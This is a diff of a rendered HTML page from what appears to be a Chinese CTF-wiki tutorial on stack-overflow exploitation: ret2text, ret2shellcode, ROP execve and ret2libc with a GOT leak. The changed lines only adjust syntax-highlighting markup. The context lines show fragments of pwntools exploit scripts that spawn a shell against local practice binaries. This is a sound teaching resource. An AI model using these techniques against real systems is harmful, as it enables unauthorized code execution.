@@ -59,7 +59,7 @@ Breakpoint<span class=w> </span><span class=m>1</span>,<span class=w> </span>0x0
 <span class=nv>$edi</span><span class=w>   </span>:<span class=w> </span>0xf7fae000<span class=w>  </span>→<span class=w>  </span>0x001b1db0
 <span class=nv>$eip</span><span class=w>   </span>:<span class=w> </span>0x080486ae<span class=w>  </span>→<span class=w>  </span>&lt;main+102&gt;<span class=w> </span>call<span class=w> </span>0x8048460<span class=w> </span>&lt;gets@plt&gt;
 </code></pre></div> <p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p> <ul> <li>s 的地址为 0xffffcd5c</li> <li>s 相对于 ebp 的偏移为 0x6c</li> <li>s 相对于返回地址的偏移为 0x6c+4</li> </ul> <p>因此最后的 payload 如下：</p> <div class=highlight><pre><span></span><code><span class=c1>##!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2text&#39;</span><span class=p>)</span>
 <span class=n>target</span> <span class=o>=</span> <span class=mh>0x804863a</span>
@@ -122,7 +122,7 @@ Start<span class=w>      </span>End<span class=w>        </span>Offset<span clas
 0xfffdd000<span class=w> </span>0xffffe000<span class=w> </span>0x00000000<span class=w> </span>rwx<span class=w> </span><span class=o>[</span>stack<span class=o>]</span>
 </code></pre></div> <p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</p> <div class=highlight><pre><span></span><code>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
 </code></pre></div> <p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p> <p>最后的 payload 如下：</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2shellcode&#39;</span><span class=p>)</span>
 <span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
@@ -197,7 +197,7 @@ Gadgets information
 
 Unique gadgets found: 4
 </code></pre></div> <p>同时，也找到对应的地址了。</p> <p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./rop&#39;</span><span class=p>)</span>
 
@@ -231,7 +231,7 @@ Strings<span class=w> </span><span class=nv>information</span>
 0x08048720<span class=w> </span>:<span class=w> </span>/bin/sh
 </code></pre></div> <p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p> <div class=highlight><pre><span></span><code><span class=nl>.plt:</span><span class=err>08048460</span><span class=w> </span><span class=c1>; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span>
 </code></pre></div> <p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下：</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2libc1&#39;</span><span class=p>)</span>
 
@@ -242,7 +242,7 @@ Strings<span class=w> </span><span class=nv>information</span>
 
 <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
 </code></pre></div> <p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 <code>'bbbb'</code> 作为虚假的地址，其后参数对应的参数内容。</p> <p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p> <h4 id=2>例2<a class=headerlink href=#2 title="Permanent link">&para;</a></h4> <p>这里以 bamboofox 中的 ret2libc2 为例 。</p> <blockquote> <p>点击下载: <a href=https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2>ret2libc2</a></p> </blockquote> <p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下：</p> <div class=highlight><pre><span></span><code><span class=c1>##!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2libc2&#39;</span><span class=p>)</span>
 
@@ -273,8 +273,8 @@ Strings<span class=w> </span><span class=nv>information</span>
 <span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
 <span class=p>}</span>
 </code></pre></div> <p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：</p> <ul> <li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li> <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下</li> <li><a href=https://github.com/niklasb/libc-database>https://github.com/niklasb/libc-database</a></li> </ul> <p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。</p> <p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p> <p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme：</p> <ul> <li><a href=https://github.com/lieanu/LibcSearcher>https://github.com/lieanu/LibcSearcher</a></li> </ul> <p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p> <p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p> <ul> <li>泄露 __libc_start_main 地址</li> <li>获取 libc 版本</li> <li>获取 system 地址与 /bin/sh 的地址</li> <li>再次执行源程序</li> <li>触发栈溢出执行 system(‘/bin/sh’)</li> </ul> <p>exp 如下：</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=n>LibcSearcher</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=n>LibcSearcher</span>
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2libc3&#39;</span><span class=p>)</span>
 
 <span class=n>ret2libc3</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ret2libc3&#39;</span><span class=p>)</span>
